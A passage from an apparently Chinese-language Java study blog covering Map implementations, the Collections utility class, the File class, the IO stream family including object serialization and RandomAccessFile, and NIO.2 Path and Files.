1.HashMap与Hashtable都实现了Map接口。由于HashMap的非线程安全性，效率上可能高于Hashtable。Hashtable的方法是Synchronize的，而HashMap不是，在多个线程访问Hashtable时，不需要自己为它的方法实现同步，而HashMap 就必须为之提供外同步。</span></span><br><span class="line"><span class="comment"> *      2.HashMap允许将null作为一个entry的key或者value，而Hashtable不允许。</span></span><br><span class="line"><span class="comment"> *      3.HashMap把Hashtable的contains方法去掉了，改成containsvalue和containsKey。因为contains方法容易让人引起误解。</span></span><br><span class="line"><span class="comment"> *      4.Hashtable继承自Dictionary类，而HashMap是Java1.2引进的Map interface的一个实现。</span></span><br><span class="line"><span class="comment"> *      5.Hashtable和HashMap采用的hash/rehash算法都大概一样，所以性能不会有很大的差异。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  3. CurrentHashMap 与 Hashtable的异同？（暂时不讲）</span></span><br><span class="line"><span class="comment"> *</span></span><br></pre></td></tr></table></figure>

<h4 id="TreeMap两种添加方式的使用"><a href="#TreeMap两种添加方式的使用" class="headerlink" title="TreeMap两种添加方式的使用"></a>TreeMap两种添加方式的使用</h4><ul>
<li>TreeMap存储Key-Value 对时，需要根据key-value 对进行排序。TreeMap可以保证所有的Key-Value 对处于<strong>有序</strong>状态。</li>
<li>TreeSet底层使用<strong>红黑树</strong>结构存储数据</li>
<li>TreeMap的Key 的排序：<ul>
<li><strong>自然排序</strong>：TreeMap的所有的Key 必须实现Comparable 接口，而且所有的Key 应该是同一个类的对象，否则将会抛出ClasssCastException</li>
<li><strong>定制排序</strong>：创建TreeMap时，传入一个Comparator 对象，该对象负责对TreeMap中的所有key 进行排序。此时不需要Map 的Key 实现Comparable 接口</li>
</ul>
</li>
<li>TreeMap判断<strong>两个key相等</strong>的标准：两个key通过compareTo()方法或者compare()方法返回0。</li>
</ul>
<h4 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h4><ul>
<li>Hashtable是个古老的Map 实现类，JDK1.0就提供了。不同于HashMap，Hashtable是线程安全的。</li>
<li>Hashtable实现原理和HashMap相同，功能相同。底层都使用哈希表结构，查询速度快，很多情况下可以互用。</li>
<li>与HashMap不同，Hashtable不允许使用null 作为key 和value</li>
<li>与HashMap一样，Hashtable也不能保证其中Key-Value 对的顺序</li>
<li>Hashtable判断两个key相等、两个value相等的标准，与HashMap一致。</li>
</ul>
<h4 id="Properties处理属性文件"><a href="#Properties处理属性文件" class="headerlink" title="Properties处理属性文件"></a>Properties处理属性文件</h4><ul>
<li>Properties 类是Hashtable的子类，该对象用于处理属性文件</li>
<li>由于属性文件里的key、value 都是字符串类型，所以<strong>Properties 里的key 和value 都是字符串类型</strong></li>
<li>存取数据时，建议使用setProperty(String key,Stringvalue)方法和getProperty(String key)方法</li>
</ul>
<h3 id="7、Collections工具类"><a href="#7、Collections工具类" class="headerlink" title="7、Collections工具类"></a>7、Collections工具类</h3><ul>
<li><p>操作数组的工具类：Arrays</p>
</li>
<li><p>Collections 是一个操作Set、List和Map 等集合的工具类</p>
</li>
<li><p>Collections 中提供了一系列静态的方法对集合元素进行排序、查询和修改等操作，还提供了对集合对象设置不可变、对集合对象实现同步控制等方法</p>
</li>
<li><p>排序操作：（均为static方法）</p>
<ul>
<li>reverse(List)：反转List 中元素的顺序</li>
<li>shuffle(List)：对List集合元素进行随机排序</li>
<li>sort(List)：根据元素的自然顺序对指定List 集合元素按升序排序</li>
<li>sort(List，Comparator)：根据指定的Comparator 产生的顺序对List 集合元素进行排序</li>
<li>swap(List，int，int)：将指定list 集合中的i处元素和j 处元素进行交换</li>
</ul>
</li>
</ul>
<h2 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h2><h3 id="1、File类的使用"><a href="#1、File类的使用" class="headerlink" title="1、File类的使用"></a>1、File类的使用</h3><h4 id="File类的实例化"><a href="#File类的实例化" class="headerlink" title="File类的实例化"></a>File类的实例化</h4><ul>
<li>java.io.File类：文件和文件目录路径的抽象表示形式，与平台无关</li>
<li>File 能新建、删除、重命名文件和目录，但File 不能访问文件内容本身。如果需要访问文件内容本身，则需要使用输入&#x2F;输出流。</li>
<li>想要在Java程序中表示一个真实存在的文件或目录，那么必须有一个File对象，但是Java程序中的一个File对象，可能没有一个真实存在的文件或目录。</li>
<li>File对象可以作为参数传递给流的构造器</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 1.如何创建file类的实例</span></span><br><span class="line"><span class="comment">     *      File(String filePath):以filePath为路径创建File对象，可以是绝对路径或者相对路径</span></span><br><span class="line"><span class="comment">     *      File(String parentPath,String childPath):以parentPath为父路径，childPath为子路径创建File对象。</span></span><br><span class="line"><span class="comment">     *      File(File parentFile,String childPath):根据一个父File对象和子文件路径创建File对象</span></span><br><span class="line"><span class="comment">     * 2.</span></span><br><span class="line"><span class="comment">     *   相对路径：相较于某个路径下，指明的路径。</span></span><br><span class="line"><span class="comment">     *   绝对路径：包含盘符在内的文件或文件目录的路径</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 3.路径分隔符</span></span><br><span class="line"><span class="comment">     *      windows:\\</span></span><br><span class="line"><span class="comment">     *      unix:/</span></span><br><span class="line"><span class="comment">     * 4.Java程序支持跨平台运行，因此路径分隔符要慎用。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 5.为了解决这个隐患，File类提供了一个常量：</span></span><br><span class="line"><span class="comment">     *   public  static final String separator。</span></span><br><span class="line"><span class="comment">     *   根据操作系统，动态的提供分隔符。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * File file1= new File(&quot;d:\\Work\\info.txt&quot;);</span></span><br><span class="line"><span class="comment">     * File file2= new File(&quot;d:&quot;+ File.separator+ &quot;Work&quot;+ File.separator+ &quot;info.txt&quot;);</span></span><br><span class="line"><span class="comment">     * File file3= new File(&quot;d:/Work&quot;);</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<h4 id="File类的常用方法"><a href="#File类的常用方法" class="headerlink" title="File类的常用方法"></a>File类的常用方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * public String getAbsolutePath()：获取绝对路径</span></span><br><span class="line"><span class="comment">     * public String getPath() ：获取路径</span></span><br><span class="line"><span class="comment">     * public String getName() ：获取名称</span></span><br><span class="line"><span class="comment">     * public String getParent()：获取上层文件目录路径。若无，返回null</span></span><br><span class="line"><span class="comment">     * public long length() ：获取文件长度（即：字节数）。不能获取目录的长度。</span></span><br><span class="line"><span class="comment">     * public long lastModified() ：获取最后一次的修改时间，毫秒值</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 如下的两个方法适用于文件目录：</span></span><br><span class="line"><span class="comment">     * public String[] list() ：获取指定目录下的所有文件或者文件目录的名称数组</span></span><br><span class="line"><span class="comment">     * public File[] listFiles() ：获取指定目录下的所有文件或者文件目录的File数组</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * File类的重命名功能</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  public boolean renameTo(File dest):把文件重命名为指定的文件路径</span></span><br><span class="line"><span class="comment">     *    比如：file1.renameTo(file2)为例：</span></span><br><span class="line"><span class="comment">     *         要想保证返回true,需要file1在硬盘中是存在的，且file2不能在硬盘中存在。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * public boolean isDirectory()：判断是否是文件目录</span></span><br><span class="line"><span class="comment">     * public boolean isFile() ：判断是否是文件</span></span><br><span class="line"><span class="comment">     * public boolean exists() ：判断是否存在</span></span><br><span class="line"><span class="comment">     * public boolean canRead() ：判断是否可读</span></span><br><span class="line"><span class="comment">     * public boolean canWrite() ：判断是否可写</span></span><br><span class="line"><span class="comment">     * public boolean isHidden() ：判断是否隐藏</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建硬盘中对应的文件或文件目录</span></span><br><span class="line"><span class="comment">     * public boolean createNewFile() ：创建文件。若文件存在，则不创建，返回false</span></span><br><span class="line"><span class="comment">     * public boolean mkdir() ：创建文件目录。如果此文件目录存在，就不创建了。如果此文件目录的上层目录不存在，也不创建。</span></span><br><span class="line"><span class="comment">     * public boolean mkdirs() ：创建文件目录。如果此文件目录存在，就不创建了。如果上层文件目录不存在，一并创建</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *     删除磁盘中的文件或文件目录</span></span><br><span class="line"><span class="comment">     * public boolean delete()：删除文件或者文件夹</span></span><br><span class="line"><span class="comment">     *     删除注意事项：Java中的删除不走回收站。</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<h3 id="2-IO流原理及流的分类"><a href="#2-IO流原理及流的分类" class="headerlink" title="2.IO流原理及流的分类"></a>2.IO流原理及流的分类</h3><h4 id="IO流原理"><a href="#IO流原理" class="headerlink" title="IO流原理"></a>IO流原理</h4><ul>
<li>I&#x2F;O是Input&#x2F;Output的缩写，I&#x2F;O技术是非常实用的技术，用于处理设备之间的数据传输。如读&#x2F;写文件，网络通讯等。</li>
<li>Java程序中，对于数据的输入&#x2F;输出操作以“流(stream)”的方式进行。</li>
<li>java.io包下提供了各种“流”类和接口，用以获取不同种类的数据，并通过标准的方法输入或输出数据。</li>
<li>输入input：读取外部数据（磁盘、光盘等存储设备的数据）到程序（内存）中。</li>
<li>输出output：将程序（内存）数据输出到磁盘、光盘等存储设备中。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/0332c07d4172fd418c663af3cf0e62c9--dd7c--image-20241002172628012.png" alt="image-20241002172628012"></p>
<h4 id="流的分类"><a href="#流的分类" class="headerlink" title="流的分类"></a>流的分类</h4><ul>
<li>按操作<strong>数据单位</strong>不同分为：字节流(8 bit)，字符流(16 bit)</li>
<li>按数据流的<strong>流向</strong>不同分为：输入流，输出流</li>
<li>按流的<strong>角色</strong>的不同分为：节点流，处理流</li>
</ul>
<table>
<thead>
<tr>
<th align="center">抽象基类</th>
<th align="center">字节流</th>
<th align="center">字符流</th>
</tr>
</thead>
<tbody><tr>
<td align="center">输入流</td>
<td align="center">InputStream</td>
<td align="center">Reader</td>
</tr>
<tr>
<td align="center">输出流</td>
<td align="center">OutputStream</td>
<td align="center">Writer</td>
</tr>
</tbody></table>
<ol>
<li><p>Java的IO流共涉及40多个类，实际上非常规则，都是从如下4个抽象基类派生的。</p>
</li>
<li><p>由这四个类派生出来的子类名称都是以其父类名作为子类名后缀。</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/4fcecdfdeb30135c60b9f69d33e65dc4--7e07--image-20241002173511265.png" alt="image-20241002173511265"></p>
<h4 id="IO-流体系"><a href="#IO-流体系" class="headerlink" title="IO 流体系"></a>IO 流体系</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/548e94ddbf27a53c4ea5dc103380530a--eba7--image-20241002173536636.png" alt="image-20241002173536636"></p>
<h3 id="3-节点流-或文件流"><a href="#3-节点流-或文件流" class="headerlink" title="3.节点流(或文件流)"></a>3.节点流(或文件流)</h3><h4 id="FileReader读入数据的基本操作"><a href="#FileReader读入数据的基本操作" class="headerlink" title="FileReader读入数据的基本操作"></a>FileReader读入数据的基本操作</h4><ul>
<li>读取文件</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>建立一个流对象，将已存在的一个文件加载进流。		</span><br><span class="line">	FileReaderfr= <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="keyword">new</span> <span class="title class_">File</span>(“Test.txt”));</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>创建一个临时存放数据的数组。</span><br><span class="line">	<span class="type">char</span>[] ch= <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>调用流对象的读取方法将流中的数据读入到数组中。		</span><br><span class="line">	fr.read(ch);</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 关闭资源。</span><br><span class="line">	fr.close();</span><br></pre></td></tr></table></figure>

<h4 id="FileWriter写出数据的操作"><a href="#FileWriter写出数据的操作" class="headerlink" title="FileWriter写出数据的操作"></a>FileWriter写出数据的操作</h4><ul>
<li>写入文件</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>创建流对象，建立数据存放文件</span><br><span class="line">    FileWriterfw= <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="keyword">new</span> <span class="title class_">File</span>(“Test.txt”));</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>调用流对象的写入方法，将数据写入流</span><br><span class="line">    fw.write(“atguigu-songhongkang”);</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>关闭流资源，并将流中的数据清空到文件中。</span><br><span class="line">    fw.close();</span><br></pre></td></tr></table></figure>

<h3 id="4-缓冲流"><a href="#4-缓冲流" class="headerlink" title="4.缓冲流"></a>4.缓冲流</h3><ul>
<li>为了提高数据读写的速度，Java API提供了带缓冲功能的流类，在使用这些流类时，会创建一个内部缓冲区数组，缺省使用8192个字节(8Kb)的缓冲区。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/e15a777941671c4cb10540b0dbdd135a--083a--image-20241002183552837.png" alt="image-20241002183552837"></p>
<ul>
<li><p>缓冲流要“套接”在相应的节点流之上，根据数据操作单位可以把缓冲流分为：</p>
<ul>
<li>BufferedInputStream和BufferedOutputStream</li>
<li>BufferedReader和BufferedWriter</li>
</ul>
</li>
<li><p>当读取数据时，数据按块读入缓冲区，其后的读操作则直接访问缓冲区</p>
</li>
<li><p>当使用BufferedInputStream读取字节文件时，BufferedInputStream会一次性从文件中读取8192个(8Kb)，存在缓冲区中，直到缓冲区装满了，才重新从文件中读取下一个8192个字节数组。</p>
</li>
<li><p>向流中写入字节时，不会直接写到文件，先写到缓冲区中直到缓冲区写满，BufferedOutputStream才会把缓冲区中的数据一次性写到文件里。使用方法flush()可以强制将缓冲区的内容全部写入输出流</p>
</li>
<li><p>关闭流的顺序和打开流的顺序相反。只要关闭最外层流即可，关闭最外层流也会相应关闭内层节点流</p>
</li>
<li><p>flush()方法的使用：手动将buffer中内容写入文件</p>
</li>
<li><p>如果是带缓冲区的流对象的close()方法，不但会关闭流，还会在关闭流之前刷新缓冲区，关闭后不能再写出。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/b3b7754d04c3b7f5e3aac395d953838d--d9d6--image-20241002183634220.png" alt="image-20241002183634220"></p>
<h3 id="5-转换流"><a href="#5-转换流" class="headerlink" title="5.转换流"></a>5.转换流</h3><h4 id="转换流概述与InputStreamReader的使用"><a href="#转换流概述与InputStreamReader的使用" class="headerlink" title="转换流概述与InputStreamReader的使用"></a>转换流概述与InputStreamReader的使用</h4><ul>
<li><p>转换流提供了在字节流和字符流之间的转换</p>
</li>
<li><p>Java API提供了两个转换流：</p>
<ul>
<li>InputStreamReader：将InputStream转换为Reader<ul>
<li>实现将字节的输入流按指定字符集转换为字符的输入流。</li>
<li>需要和InputStream“套接”。</li>
<li>构造器<ul>
<li>public InputStreamReader(InputStreamin)</li>
<li>public InputSreamReader(InputStreamin,StringcharsetName)</li>
<li>如：Reader isr&#x3D; new InputStreamReader(System.in,”gbk”);</li>
</ul>
</li>
</ul>
</li>
<li>OutputStreamWriter：将Writer转换为OutputStream<ul>
<li>实现将字符的输出流按指定字符集转换为字节的输出流。</li>
<li>需要和OutputStream“套接”。</li>
<li>构造器<ul>
<li>public OutputStreamWriter(OutputStreamout)</li>
<li>public OutputSreamWriter(OutputStreamout,StringcharsetName)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>字节流中的数据都是字符时，转成字符流操作更高效。</p>
</li>
<li><p>很多时候我们使用转换流来处理文件乱码问题。实现编码和解码的功能。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/1d2348b58ca17120964e61d189a8d294--c67c--image-20241002184541945.png" alt="image-20241002184541945"></p>
<h4 id="多种字符编码集的说明"><a href="#多种字符编码集的说明" class="headerlink" title="多种字符编码集的说明"></a>多种字符编码集的说明</h4><ul>
<li><p>编码表的由来</p>
<blockquote>
<p>计算机只能识别二进制数据，早期由来是电信号。为了方便应用计算机，让它可以识别各个国家的文字。就将各个国家的文字用数字来表示，并一一对应，形成一张表。这就是编码表。</p>
</blockquote>
</li>
<li><p>常见的编码表</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 4.字符集</span></span><br><span class="line"><span class="comment">  *  ASCII：美国标准信息交换码。</span></span><br><span class="line"><span class="comment">  *     用一个字节的7位可以表示。</span></span><br><span class="line"><span class="comment">  *  ISO8859-1：拉丁码表。欧洲码表</span></span><br><span class="line"><span class="comment">  *     用一个字节的8位表示。</span></span><br><span class="line"><span class="comment">  *  GB2312：中国的中文编码表。最多两个字节编码所有字符</span></span><br><span class="line"><span class="comment">  *  GBK：中国的中文编码表升级，融合了更多的中文文字符号。最多两个字节编码</span></span><br><span class="line"><span class="comment">  *  Unicode：国际标准码，融合了目前人类使用的所有字符。为每个字符分配唯一的字符码。所有的文字都用两个字节来表示。</span></span><br><span class="line"><span class="comment">  *  UTF-8：变长的编码方式，可用1-4个字节来表示一个字符。</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Unicode不完美，这里就有三个问题，一个是，我们已经知道，英文字母只用一个字节表示就够了，第二个问题是如何才能区别Unicode和ASCII？计算机怎么知道两个字节表示一个符号，而不是分别表示两个符号呢？第三个，如果和GBK等双字节编码方式一样，用最高位是1或0表示两个字节和一个字节，就少了很多值无法用于表示字符，不够表示所有字符。Unicode在很长一段时间内无法推广，直到互联网的出现。</li>
<li>面向传输的众多UTF（UCS Transfer Format）标准出现了，顾名思义，<strong>UTF-8就是每次8个位传输数据，而UTF-16就是每次16个位。</strong>这是为传输而设计的编码，并使编码无国界，这样就可以显示全世界上所有文化的字符了。</li>
<li>Unicode只是定义了一个庞大的、全球通用的字符集，并为每个字符规定了唯一确定的编号，具体存储成什么样的字节流，取决于字符编码方案。推荐的Unicode编码是UTF-8和UTF-16。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/44407cfc98725875886f4b92a502a464--d8e6--image-20241002185539502.png" alt="image-20241002185539502"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/d23001b07313a32006b232017fccbda7--c8d3--image-20241002185546613.png" alt="image-20241002185546613"></p>
<h3 id="6-标准输入、输出流"><a href="#6-标准输入、输出流" class="headerlink" title="6.标准输入、输出流"></a>6.标准输入、输出流</h3><ul>
<li>System.in和System.out分别代表了系统标准的输入和输出设备</li>
<li>默认输入设备是：键盘，输出设备是：显示器</li>
<li>System.in的类型是InputStream</li>
<li>System.out的类型是PrintStream，其是OutputStream的子类FilterOutputStream的子类</li>
<li>重定向：通过System类的setIn，setOut方法对默认设备进行改变。<ul>
<li>public static void setIn(InputStreamin)</li>
<li>public static void setOut(PrintStreamout)</li>
</ul>
</li>
</ul>
<h3 id="7-打印流"><a href="#7-打印流" class="headerlink" title="7.打印流"></a>7.打印流</h3><ul>
<li>实现将基本数据类型的数据格式转化为字符串输出</li>
<li>打印流：PrintStream和PrintWriter<ul>
<li>提供了一系列重载的print()和println()方法，用于多种数据类型的输出</li>
<li>PrintStream和PrintWriter的输出不会抛出IOException异常</li>
<li>PrintStream和PrintWriter有自动flush功能</li>
<li>PrintStream 打印的所有字符都使用平台的默认字符编码转换为字节。在需要写入字符而不是写入字节的情况下，应该使用PrintWriter 类。</li>
<li>System.out返回的是PrintStream的实例</li>
</ul>
</li>
</ul>
<h3 id="8-数据流"><a href="#8-数据流" class="headerlink" title="8.数据流"></a>8.数据流</h3><ul>
<li><p>为了方便地操作Java语言的基本数据类型和String的数据，可以使用数据流。</p>
</li>
<li><p>数据流有两个类：(用于读取和写出基本数据类型、String类的数据）</p>
<ul>
<li>DataInputStream和DataOutputStream</li>
<li>分别“套接”在InputStream和OutputStream子类的流上</li>
</ul>
</li>
<li><p>DataInputStream中的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">readBoolean</span><span class="params">()</span>	<span class="type">byte</span> <span class="title function_">readByte</span><span class="params">()</span></span><br><span class="line"><span class="type">char</span> <span class="title function_">readChar</span><span class="params">()</span>	<span class="type">float</span> <span class="title function_">readFloat</span><span class="params">()</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">readDouble</span><span class="params">()</span>	<span class="type">short</span> <span class="title function_">readShort</span><span class="params">()</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">readLong</span><span class="params">()</span>	<span class="type">int</span> <span class="title function_">readInt</span><span class="params">()</span></span><br><span class="line">String <span class="title function_">readUTF</span><span class="params">()</span>	<span class="keyword">void</span> <span class="title function_">readFully</span><span class="params">(<span class="type">byte</span>[s] b)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>DataOutputStream中的方法</p>
<ul>
<li>将上述的方法的read改为相应的write即可。</li>
</ul>
</li>
</ul>
<h3 id="9-对象流"><a href="#9-对象流" class="headerlink" title="9.对象流"></a>9.对象流</h3><h4 id="对象序列化机制的理解"><a href="#对象序列化机制的理解" class="headerlink" title="对象序列化机制的理解"></a>对象序列化机制的理解</h4><ul>
<li>ObjectInputStream和OjbectOutputSteam</li>
<li>用于存储和读取基本数据类型数据或对象的处理流。它的强大之处就是可以把Java中的对象写入到数据源中，也能把对象从数据源中还原回来。</li>
<li>序列化：用ObjectOutputStream类保存基本类型数据或对象的机制</li>
<li>反序列化：用ObjectInputStream类读取基本类型数据或对象的机制</li>
<li>ObjectOutputStream和ObjectInputStream不能序列化static和transient修饰的成员变量</li>
<li>对象序列化机制允许把内存中的Java对象转换成平台无关的二进制流，从而允许把这种二进制流持久地保存在磁盘上，或通过网络将这种二进制流传输到另一个网络节点。&#x2F;&#x2F;当其它程序获取了这种二进制流，就可以恢复成原来的Java对象</li>
<li>序列化的好处在于可将任何实现了Serializable接口的对象转化为字节数据，使其在保存和传输时可被还原</li>
<li>序列化是RMI（Remote Method Invoke –远程方法调用）过程的参数和返回值都必须实现的机制，而RMI 是JavaEE的基础。因此序列化机制是JavaEE平台的基础</li>
<li>如果需要让某个对象支持序列化机制，则必须让对象所属的类及其属性是可序列化的，为了让某个类是可序列化的，该类必须实现如下两个接口之一。否则，会抛出NotSerializableException异常<ul>
<li>Serializable</li>
<li>Externalizable</li>
</ul>
</li>
</ul>
<h4 id="自定义类实现序列化与反序列化操作"><a href="#自定义类实现序列化与反序列化操作" class="headerlink" title="自定义类实现序列化与反序列化操作"></a>自定义类实现序列化与反序列化操作</h4><ul>
<li><p>若某个类实现了Serializable接口，该类的对象就是可序列化的：</p>
<ul>
<li>创建一个ObjectOutputStream</li>
<li>调用ObjectOutputStream对象的writeObject(对象) 方法输出可序列化对象</li>
<li>注意写出一次，操作flush()一次</li>
</ul>
</li>
<li><p>反序列化</p>
<ul>
<li>创建一个ObjectInputStream调用readObject() 方法读取流中的对象</li>
</ul>
</li>
<li><p>强调：如果某个类的属性不是基本数据类型或String  类型，而是另一个引用类型，那么这个引用类型必须是可序列化的，否则拥有该类型的Field 的类也不能序列化</p>
</li>
<li><p>Person类</p>
</li>
</ul>
<h4 id="serialVersionUID的理解"><a href="#serialVersionUID的理解" class="headerlink" title="serialVersionUID的理解"></a>serialVersionUID的理解</h4><ul>
<li><p>凡是实现Serializable接口的类都有一个表示序列化版本标识符的静态变量：</p>
<ul>
<li>private static final long serialVersionUID;</li>
<li>serialVersionUID用来表明类的不同版本间的兼容性。简言之，其目的是以序列化对象进行版本控制，有关各版本反序列化时是否兼容。</li>
<li>如果类没有显示定义这个静态常量，它的值是Java运行时环境根据类的内部细节自动生成的。若类的实例变量做了修改，serialVersionUID可能发生变化。故建议，显式声明。</li>
</ul>
</li>
<li><p>简单来说，Java的序列化机制是通过在运行时判断类的serialVersionUID来验证版本一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常。(InvalidCastException)</p>
</li>
<li><p>Person类</p>
</li>
</ul>
<h3 id="10-随机存取文件流"><a href="#10-随机存取文件流" class="headerlink" title="10.随机存取文件流"></a>10.随机存取文件流</h3><ul>
<li><p>RandomAccessFile 声明在java.io包下，但直接继承于java.lang.Object类。并且它实现了DataInput、DataOutput这两个接口，也就意味着这个类既可以读也可以写。</p>
</li>
<li><p>RandomAccessFile 类支持“随机访问” 的方式，程序可以直接跳到文件的任意地方来读、写文件</p>
<ul>
<li>支持只访问文件的部分内容</li>
<li>可以向已存在的文件后追加内容</li>
</ul>
</li>
<li><p>RandomAccessFile 对象包含一个记录指针，用以标示当前读写处的位置。RandomAccessFile类对象可以自由移动记录指针：</p>
<ul>
<li>long getFilePointer()：获取文件记录指针的当前位置</li>
<li>void seek(long pos)：将文件记录指针定位到pos位置</li>
</ul>
</li>
<li><p>构造器</p>
<ul>
<li>public RandomAccessFile(Filefile, Stringmode) </li>
<li>public RandomAccessFile(Stringname, Stringmode)</li>
</ul>
</li>
<li><p>创建RandomAccessFile类实例需要指定一个mode 参数，该参数指定RandomAccessFile的访问模式：</p>
<ul>
<li>r: 以只读方式打开</li>
<li>rw：打开以便读取和写入</li>
<li>rwd:打开以便读取和写入；同步文件内容的更新</li>
<li>rws:打开以便读取和写入；同步文件内容和元数据的更新</li>
</ul>
</li>
<li><p>如果模式为只读r。则不会创建文件，而是会去读取一个已经存在的文件，如果读取的文件不存在则会出现异常。如果模式为rw读写。如果文件不存在则会去创建文件，如果存在则不会创建。</p>
</li>
</ul>
<h3 id="11-NIO-2中Path、Paths、Files类的使用"><a href="#11-NIO-2中Path、Paths、Files类的使用" class="headerlink" title="11.NIO.2中Path、Paths、Files类的使用"></a>11.NIO.2中Path、Paths、Files类的使用</h3><ul>
<li><p>Java NIO (New IO，Non-Blocking IO)是从Java 1.4版本开始引入的一套新的IO API，可以替代标准的Java IO API。NIO与原来的IO有同样的作用和目的，但是使用的方式完全不同，NIO支持面向缓冲区的(IO是面向流的)、基于通道的IO操作。NIO将以更加高效的方式进行文件的读写操作。</p>
</li>
<li><p>Java API中提供了两套NIO，一套是针对标准输入输出NIO，另一套就是网络编程NIO。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">|-----java.nio.channels.Channel</span><br><span class="line">    |-----FileChannel:处理本地文件</span><br><span class="line">    |-----SocketChannel：TCP网络编程的客户端的Channel</span><br><span class="line">    |-----ServerSocketChannel:TCP网络编程的服务器端的Channel</span><br><span class="line">    |-----DatagramChannel：UDP网络编程中发送端和接收端的Channel</span><br></pre></td></tr></table></figure>
</li>
<li><p>随着JDK 7 的发布，Java对NIO进行了极大的扩展，增强了对文件处理和文件系统特性的支持，以至于我们称他们为NIO.2。因为NIO 提供的一些功能，NIO已经成为文件处理中越来越重要的部分。</p>
</li>
<li><p>早期的Java只提供了一个File类来访问文件系统，但File类的功能比较有限，所提供的方法性能也不高。而且，大多数方法在出错时仅返回失败，并不会提供异常信息。</p>
</li>
<li><p>NIO. 2为了弥补这种不足，引入了Path接口，代表一个平台无关的平台路径，描述了目录结构中文件的位置。Path可以看成是File类的升级版本，实际引用的资源也可以不存在。</p>
</li>
<li><p>在以前IO操作都是这样写的:</p>
<ul>
<li>import java.io.File;</li>
<li>File file &#x3D; new File(“index.html”);</li>
</ul>
</li>
<li><p>但在Java7 中，我们可以这样写：</p>
<ul>
<li>import java.nio.file.Path;</li>
<li>import java.nio.file.Paths;</li>
<li>Path path &#x3D; Paths.get(“index.html”);</li>
</ul>
</li>
<li><p>同时，NIO.2在java.nio.file包下还提供了Files、Paths工具类，Files包含了大量静态的工具方法来操作文件；Paths则包含了两个返回Path的静态工厂方法。</p>
</li>
<li><p>Paths 类提供的静态get() 方法用来获取Path 对象：</p>
<ul>
<li>static Pathget(String first, String … more) : 用于将多个字符串串连成路径</li>
<li>static Path get(URI uri): 返回指定uri对应的Path路径</li>
</ul>
</li>
<li><p>Path接口</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/a82dd7550a4c16ef3ea37fc6aa8609a6--7334--image-20241002190644089.png" alt="image-20241002190644089"></p>
<ul>
<li>Files 类</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/8254c3f67ca2c7111a66692567b84c67--2a50--image-20241002191211308.png" alt="image-20241002191211308"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/ba3be1ca719cecb6fcccee7568a403d6--ec6a--image-20241002191223484.png" alt="image-20241002191223484"></p>
<blockquote>
<p>一些对于NIO与IO的对比</p>
</blockquote>
